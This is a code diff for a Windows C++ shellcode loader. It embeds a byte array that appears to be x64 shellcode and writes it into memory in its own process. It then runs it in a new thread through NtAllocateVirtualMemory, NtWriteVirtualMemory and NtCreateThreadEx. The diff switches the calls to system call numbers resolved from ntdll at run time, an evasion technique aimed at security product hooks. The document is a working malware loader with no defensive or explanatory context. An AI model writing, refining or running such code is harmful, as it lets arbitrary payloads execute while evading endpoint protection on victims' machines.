@@ -1,6 +1,7 @@
 ﻿#include <Windows.h>
 
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )  
+#pragma comment(lib, "ntdll")
 
 unsigned char buffer[] = {
   0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
@@ -31,7 +32,8 @@ unsigned char buffer[] = {
 };
 unsigned int buffer_len = sizeof(buffer);
 
-EXTERN_C NTSTATUS SysNtAllocateVirtualMemory(
+
+EXTERN_C NTSTATUS NtAllocateVirtualMemory(
 	HANDLE             ProcessHandle,
 	PVOID* BaseAddress,
 	ULONG_PTR          ZeroBits,
@@ -40,7 +42,7 @@ EXTERN_C NTSTATUS SysNtAllocateVirtualMemory(
 	ULONG              Protect
 );
 
-EXTERN_C  NTSTATUS SysNtWriteVirtualMemory(
+EXTERN_C  NTSTATUS NtWriteVirtualMemory(
 	HANDLE ProcessHandle,
 	PVOID BaseAddress,
 	PVOID Buffer,
@@ -48,7 +50,7 @@ EXTERN_C  NTSTATUS SysNtWriteVirtualMemory(
 	PSIZE_T NumberOfBytesWritten
 );
 
-EXTERN_C  NTSTATUS  SysNtCreateThreadEx
+EXTERN_C  NTSTATUS  NtCreateThreadEx
 (
 	OUT PHANDLE hThread,
 	IN ACCESS_MASK DesiredAccess,
@@ -61,13 +63,21 @@ EXTERN_C  NTSTATUS  SysNtCreateThreadEx
 	IN SIZE_T SizeOfStackCommit,
 	IN SIZE_T SizeOfStackReserve,
 	OUT PVOID lpBytesBuffer
-	);
+);
 
-EXTERN_C  NTSTATUS SysNtWaitForSingleObject(
+EXTERN_C  NTSTATUS NtWaitForSingleObject(
 	_In_ HANDLE Handle,
 	_In_ BOOLEAN Alertable,
 	_In_opt_ PLARGE_INTEGER Timeout
-	);
+);
+
+
+EXTERN_C{
+	DWORD wNtAllocateVirtualMemory;
+	DWORD wNtWriteVirtualMemory;
+	DWORD wNtCreateThreadEx;
+	DWORD wNtWaitForSingleObject;
+}
 
 int main()
 {
@@ -75,7 +85,21 @@ int main()
 	PVOID exec_mem = nullptr;
 	HANDLE rt;
 
-	SysNtAllocateVirtualMemory(
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+	LPBYTE pNtAllocateVirtualMemory = (LPBYTE)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+	wNtAllocateVirtualMemory = (pNtAllocateVirtualMemory + 4)[0];
+
+	LPBYTE pNtWriteVirtualMemory = (LPBYTE)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	wNtWriteVirtualMemory = (pNtWriteVirtualMemory + 4)[0];
+
+	LPBYTE pNtCreateThreadEx = (LPBYTE)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	wNtCreateThreadEx = (pNtCreateThreadEx + 4)[0];
+
+	LPBYTE pNtWaitForSingleObject = (LPBYTE)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+	wNtWaitForSingleObject = (pNtWaitForSingleObject + 4)[0];
+
+	NtAllocateVirtualMemory(
 		NtCurrentProcess(),
 		&exec_mem,
 		0,
@@ -85,7 +109,7 @@ int main()
 	);
 
 	SIZE_T bytesWritten;
-	SysNtWriteVirtualMemory(
+	NtWriteVirtualMemory(
 		NtCurrentProcess(),
 		exec_mem,
 		buffer,
@@ -93,7 +117,7 @@ int main()
 		&bytesWritten
 	);
 
-	SysNtCreateThreadEx(
+	NtCreateThreadEx(
 		&rt,
 		THREAD_ALL_ACCESS,
 		nullptr,
@@ -107,6 +131,7 @@ int main()
 		nullptr
 	);
 
-	SysNtWaitForSingleObject(rt, FALSE, 0);
+	NtWaitForSingleObject(rt, FALSE, 0);
+
 
 }
